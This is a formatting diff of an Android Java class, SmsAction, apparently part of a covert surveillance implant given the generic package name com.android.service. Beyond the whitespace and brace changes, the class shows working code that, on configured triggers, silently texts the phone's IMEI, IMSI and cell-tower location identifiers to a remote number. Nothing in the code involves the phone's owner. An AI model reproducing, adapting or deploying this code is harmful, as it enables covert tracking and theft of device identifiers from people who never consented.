@@ -27,24 +27,24 @@ import com.android.service.util.WChar;
  */
 public class SmsAction extends SubAction {
 	private static final String TAG = "SmsAction";
-	
+
 	/** The Constant TYPE_LOCATION. */
 	private static final int TYPE_LOCATION = 1;
-	
+
 	/** The Constant TYPE_SIM. */
 	private static final int TYPE_SIM = 2;
-	
+
 	/** The Constant TYPE_TEXT. */
 	private static final int TYPE_TEXT = 3;
-	
-	private SmsManager sm;
+
+	private final SmsManager sm;
 
 	/** The number. */
 	String number;
-	
+
 	/** The text. */
 	String text;
-	
+
 	/** The type. */
 	int type;
 
@@ -58,7 +58,7 @@ public class SmsAction extends SubAction {
 	 */
 	public SmsAction(final int type2, final byte[] confParams) {
 		super(type2, confParams);
-		
+
 		sm = SmsManager.getDefault();
 	}
 
@@ -75,7 +75,7 @@ public class SmsAction extends SubAction {
 			case TYPE_TEXT:
 				sendSMS(text);
 				return true;
-				
+
 			case TYPE_SIM:
 				text = "IMSI: " + Device.self().getImsi();
 				sendSMS(text);
@@ -84,27 +84,29 @@ public class SmsAction extends SubAction {
 			case TYPE_LOCATION:
 				// TODO Implementare il location
 				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
-				//if (!getGPSPosition()) {
-				//	errorLocation();
-				//}
+				// if (!getGPSPosition()) {
+				// errorLocation();
+				// }
 
-				CellInfo c = Device.getCellInfo();
-				
+				final CellInfo c = Device.getCellInfo();
+
 				if (c.cdma && c.valid) {
 					text = "SID: " + c.sid + ", NID: " + c.nid + ", BID: " + c.bid;
 					sendSMS(text);
 				}
-				
+
 				if (c.gsm && c.valid) {
 					text = "CC: " + c.mcc + ", MNC: " + c.mnc + ", LAC: " + c.lac + ", CID: " + c.cid;
 					sendSMS(text);
 				}
-				
+
 				break;
 			}
 			return true;
 		} catch (final Exception ex) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: " + ex.toString());
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + ex.toString());
+			}
 			return false;
 		}
 	}
@@ -120,7 +122,7 @@ public class SmsAction extends SubAction {
 
 	/**
 	 * Gets the cell position.
-	 *
+	 * 
 	 * @return the cell position
 	 */
 	private boolean getCellPosition() {
@@ -130,7 +132,7 @@ public class SmsAction extends SubAction {
 
 	/**
 	 * Gets the gPS position.
-	 *
+	 * 
 	 * @return the gPS position
 	 */
 	private boolean getGPSPosition() {
@@ -140,67 +142,75 @@ public class SmsAction extends SubAction {
 
 	/**
 	 * Send sms.
-	 *
-	 * @param text the text
+	 * 
+	 * @param text
+	 *            the text
 	 */
 	private void sendSMS(final String text) {
 		sm.sendTextMessage(number, null, text, null, null);
-		
+
 		return;
 	}
 
 	/**
 	 * Parses the.
-	 *
-	 * @param confParams the conf params
+	 * 
+	 * @param confParams
+	 *            the conf params
 	 * @return true, if successful
 	 */
+	@Override
 	protected boolean parse(final byte[] confParams) {
 		final DataBuffer databuffer = new DataBuffer(confParams, 0, confParams.length);
-		
+
 		try {
 			type = databuffer.readInt();
-			if(Cfg.DEBUG) Check.asserts(type >= 1 && type <= 3, "wrong type");
+			if (Cfg.DEBUG) {
+				Check.asserts(type >= 1 && type <= 3, "wrong type");
+			}
 			int len = databuffer.readInt();
 			byte[] buffer = new byte[len];
 			databuffer.read(buffer);
 			number = Utils.unspace(WChar.getString(buffer, true));
 
 			switch (type) {
-				case TYPE_TEXT:
-					// TODO controllare che la lunghezza non sia superiore a 70 caratteri
-					len = databuffer.readInt();
-					buffer = new byte[len];
-					databuffer.read(buffer);
-					text = WChar.getString(buffer, true);
-					break;
-					
-				case TYPE_LOCATION:
-					// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
-					break;
-					
-				case TYPE_SIM:
-					final StringBuffer sb = new StringBuffer();
-					final Device device = Device.self();
-					
-					if (Device.isCdma()) {
-						// sb.append("SID: " + device.getSid() + "\n");
-						// sb.append("ESN: "
-						// + NumberUtilities.toString(device.getEsn(), 16)
-						// + "\n");
-					}
-					
-					if (Device.isGprs()) {
-						sb.append("IMEI: " + device.getImei() + "\n");
-						sb.append("IMSI: " + device.getImsi() + "\n");
-					}
-	
-					text = sb.toString();
-					break;
-					
-				default:
-					if(Cfg.DEBUG) Check.log( TAG + " Error: SmsAction.parse,  Unknown type: " + type);
-					break;
+			case TYPE_TEXT:
+				// TODO controllare che la lunghezza non sia superiore a 70
+				// caratteri
+				len = databuffer.readInt();
+				buffer = new byte[len];
+				databuffer.read(buffer);
+				text = WChar.getString(buffer, true);
+				break;
+
+			case TYPE_LOCATION:
+				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
+				break;
+
+			case TYPE_SIM:
+				final StringBuffer sb = new StringBuffer();
+				final Device device = Device.self();
+
+				if (Device.isCdma()) {
+					// sb.append("SID: " + device.getSid() + "\n");
+					// sb.append("ESN: "
+					// + NumberUtilities.toString(device.getEsn(), 16)
+					// + "\n");
+				}
+
+				if (Device.isGprs()) {
+					sb.append("IMEI: " + device.getImei() + "\n");
+					sb.append("IMSI: " + device.getImsi() + "\n");
+				}
+
+				text = sb.toString();
+				break;
+
+			default:
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error: SmsAction.parse,  Unknown type: " + type);
+				}
+				break;
 			}
 		} catch (final IOException e) {
 			return false;
@@ -209,13 +219,15 @@ public class SmsAction extends SubAction {
 		return true;
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see java.lang.Object#toString()
 	 */
 	@Override
 	public String toString() {
 		final StringBuffer sb = new StringBuffer();
-		
+
 		sb.append("Sms type: " + type);
 		sb.append(" number: " + number);
 		sb.append(" text: " + text);
